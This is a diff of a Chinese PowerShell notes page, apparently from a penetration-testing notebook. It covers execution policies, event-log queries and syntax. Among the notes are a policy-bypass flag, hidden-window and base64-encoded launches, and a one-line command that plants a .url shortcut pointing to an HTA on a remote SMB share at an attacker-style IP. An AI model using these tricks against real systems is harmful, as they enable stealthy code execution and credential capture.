@@ -6,12 +6,14 @@ tags:
 ## 执行策略
 
 **仅对脚本。命令不受此限制。**
+
 - Restricted：默认，**不能运行脚本**
 - RemoteSigned：**本地创建的脚本可以运行**；对于网上下载的脚本，如果有受信任发布者的数字签名则可运行
 - AllSigned：如果脚本有受信任发布者的数字签名则可运行
 - Unrestricted：**不受限制**（即不管来自哪里、不管是否有签名）
 
 **相关命令：**
+
 - 查看当前策略：`Get-ExecutionPolicy`
 - 修改策略：`Set-ExecutionPolicy <policy-name>`。需要管理员权限（一般没必要用这个，直接看下面的命令↓）
 - 绕过：`powershell (-ep bypass | -exec bypass)`
@@ -42,6 +44,7 @@ tags:
 ### 环境变量
 
 查看：
+
 - `gci $env:*`
 - `ls env:`
 - `$env:userprofile`
@@ -112,6 +115,7 @@ gc log.txt | %{ $_ -replace '\d+', '($0)' }    ## sed
 #### 上传
 
 [[FileTransfers-Windows#Upload]]
+
 #### 下载
 
 [[FileTransfers-Windows#Download]]
@@ -131,6 +135,7 @@ web快捷方式
 ```powershell
 $url = "file://10.10.14.46/share/test.hta"; $shortcutPath = "C:\inetpub\testing\test.url"; $shortcutContent = "[InternetShortcut]`r`nURL=$url"; Set-Content -Path $shortcutPath -Value $shortcutContent
 ```
+
 - `file://`的话似乎需要开启SMB服务。
 
 
@@ -148,18 +153,18 @@ $url = "file://10.10.14.46/share/test.hta"; $shortcutPath = "C:\inetpub\testing\
 - `-NonInteractive`（`-NonI`）：它显示窗口，只是禁用交互。
 - `-w Hidden`：`WindowStyle='Hidden'`
 - `-c`：`-Command`
-	> 关于**单引号内**不能用双引号而要用两个单引号——[在单引号内要输出一个单引号就要用两个单引号——相当于单引号用来转义](https://www.zhiu.cn/60919.html)。下图例：
-	> ![[Pasted image 20240309124417.png]]
+	- 关于**单引号内**不能用双引号而要用两个单引号——[在单引号内要输出一个单引号就要用两个单引号——相当于单引号用来转义](https://www.zhiu.cn/60919.html)。下图例：  
+	![[Pasted image 20240309124417.png]]
 - `-noexit`：执行后不退出。对于如键盘记录等脚本来说很重要，因此这些脚本得以持续执行
 - `-enc`（`-e`）：执行编码字符。（相对于-c则是执行单纯字符）
 	- 其base64编码仅支持UTF-16LE（“Unicode”）字符串，不支持utf-8。【因为通常powershell的默认编码是Unicode UTF-16LE】
 	- 转base64（UTF-16LE）：
 		- 在Windows转base64（UTF-16LE）的命令：`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('<your command>'))`
 		- 用LINUX命令（iconv）：[[Linux命令#^f44db6|echo -en "[Command]" | iconv -t UTF-16LE | base64 -w 0]]
-		- 用CyberChef：
+		- 用CyberChef：  
 			![[Pasted image 20240309124158.png]]
 
-> `[https://redcanary.com/blog/investigating-powershell-attacks/](https://redcanary.com/blog/investigating-powershell-attacks/)`
+> [https://redcanary.com/blog/investigating-powershell-attacks/](https://redcanary.com/blog/investigating-powershell-attacks/)
 
 
 
@@ -170,16 +175,17 @@ $url = "file://10.10.14.46/share/test.hta"; $shortcutPath = "C:\inetpub\testing\
 log PATH: `C:\Windows\System32\winevt\Logs\`
 
 用户可以通过三种主要方式从 Windows 会话访问事件日志。它们是：
+
 - 图形 Windows 事件查看器`eventvwr.msc`
 - 命令行`wevtutil.exe`
 - PowerShell cmdlet: `Get-WinEvent`
 
 ### Get-Eventlog
 
-> [【 Get-EventLog 】コマンドレット――Windowsのイベントログを取得する](https://atmarkit.itmedia.co.jp/ait/spv/1608/23/news023.html)
+> [【 Get-EventLog 】コマンドレット――Windowsのイベントログを取得する](https://atmarkit.itmedia.co.jp/ait/spv/1608/23/news023.html)  
 > [Get-Eventlogの使い方から覚えていくPowershellの基本的な使い方](https://qiita.com/Anubis_369/items/d0566143a1356a2f8ec5)
 
-> [!NOTE] 将被 [[powershell#Get-WinEvent|Get-WinEvent]] 替代
+> [!NOTE] 将被 [[powershell#Get-WinEvent|Get-WinEvent]] 替代  
 > Application or Service log的话推荐用`Get-WinEvent`。
 
 - `Get-EventLog "Windows PowerShell" -InstanceID 400 -After "2022/12/21" -Before "2022/12/22" | Export-Csv -Encoding Default $env:HOMEPATH"\Downloads\powershellLog.csv"`
@@ -201,6 +207,7 @@ log PATH: `C:\Windows\System32\winevt\Logs\`
 #### 指定时间范围
 
 时间格式：`YYYY/MM/DD`
+
 - `-Before`
 - `-After`
 
@@ -221,7 +228,7 @@ Get-WinEvent -LogName Application | Where-Object { $_.ProviderName -Match 'WLMS'
 ```
 
 **`Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString'`**
-> [!NOTE] 我们可以通过运行以下命令获得与上面相同的结果
+> [!NOTE] 我们可以通过运行以下命令获得与上面相同的结果  
 > 根据 Microsoft 的说法，在处理大型事件日志时，将对象沿着管道发送到 Where-Object 命令的效率很低。建议使用 Get-WinEvent cmdlet 的 FilterHashtable 参数来筛选事件日志。
 
 ```powershell
@@ -230,10 +237,12 @@ Get-WinEvent -FilterHashtable @{
   ProviderName='WLMS' 
 }
 ```
-- 各参数不分行的话可以用分号分隔：`@{ <name> = <value>; <name> = <value>  ...}`
+
+- 各参数不分行的话可以用分号分隔：`@{ <name> = <value>; <name> = <value>  ...}`  
 	![[Pasted image 20240309120419.png]]
-	- 即下图“Windows 事件查看器”的这些：
-		![[Pasted image 20240309120522.png]]
+
+- 即下图“Windows 事件查看器”的这些：  
+	![[Pasted image 20240309120522.png]]
 
 
 
@@ -251,7 +260,7 @@ Get-WinEvent -FilterHashtable @{
 
 可用于声明在变量中间或内部带有空格的变量。等：
 
-> What might not be obvious on a first glance is that you can use any [provider](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_providers?view=powershell-6) within `${}`, for example: `${c:\tmp\foo.txt}="Hello World"`
+> What might not be obvious on a first glance is that you can use any [provider](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_providers?view=powershell-6) within `${}`, for example: `${c:\tmp\foo.txt}="Hello World"`  
 > The effect depends on the provider. For the file system provider the example changes the content of the specified file.
 
 **也表示脚本块，在当前进程中执行。**
@@ -260,7 +269,7 @@ Get-WinEvent -FilterHashtable @{
 
 ![[Pasted image 20240309130014.png]]
 
-例子：
+例子：  
 ![[Pasted image 20240309130105.png]]
 > https://learn.microsoft.com/en-us/dotnet/api/system.io.file.copy?redirectedfrom=MSDN&view=net-7.0#System_IO_File_Copy_System_String_System_String_System_Boolean_
 
@@ -272,7 +281,8 @@ Get-WinEvent -FilterHashtable @{
 ### dot source
 
 `. .\脚本名`
-通常，`.\脚本名`执行后，脚本内的变量等将被废弃。
+
+通常，`.\脚本名`执行后，脚本内的变量等将被废弃。  
 但是，用`. .\脚本名`执行后，脚本内的变量等还会存在。（大概是Linux里子进程继承环境变量的意思）
 
 ### `&`调用运算符
@@ -280,14 +290,16 @@ Get-WinEvent -FilterHashtable @{
 运行储存在变量中由字符串/脚本块表示的命令（注意：所以该命令不解析字符串/参数）
 > [call-operator](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_operators?view=powershell-5.1#call-operator-)
 
-例子：
+例子：  
 `powershell -exec bypass -Command "& {import-module test.ps1}"`
+
 - 如果没有`&`运算符，则仅仅输出大括号内的内容（"import-module test.ps1"，由于用大括号表示了变量）
 - 如果连大括号都没有，则把双引号内的内容整体当命令。（那所以为什么要用&{}来执行？）
 
 ### `%` (`ForEach-Object`)
 
-`[byte[]]$bytes = 0..65535|%{0};`  
+`[byte[]]$bytes = 0..65535|%{0};`
+
 生成一个长度为65536的字节数组，每个字节都初始化为0。
 
 
@@ -314,14 +326,17 @@ Write-Host "Hello, $($name)!"
 ### 数组
 
 创建方式（有多种）：
-`$id = 1,2,3,4`
-`$id = (1,2,3,4)`
-`$id = @(1,2,3,4)`
+
+- `$id = 1,2,3,4`
+- `$id = (1,2,3,4)`
+- `$id = @(1,2,3,4)`
+
 - 使用`@`显示声明数组。好处：在创建单元素数组时，如果使用`(1)`则表示单个数值 1。没有 `@()`时PowerShell 不会把单个值视为数组。
 
 访问：
-`$id[0,3]`：查询第1~4个
-`$id.count`：统计个数
+
+- `$id[0,3]`：查询第1~4个
+- `$id.count`：统计个数
 
 
 ### 字典
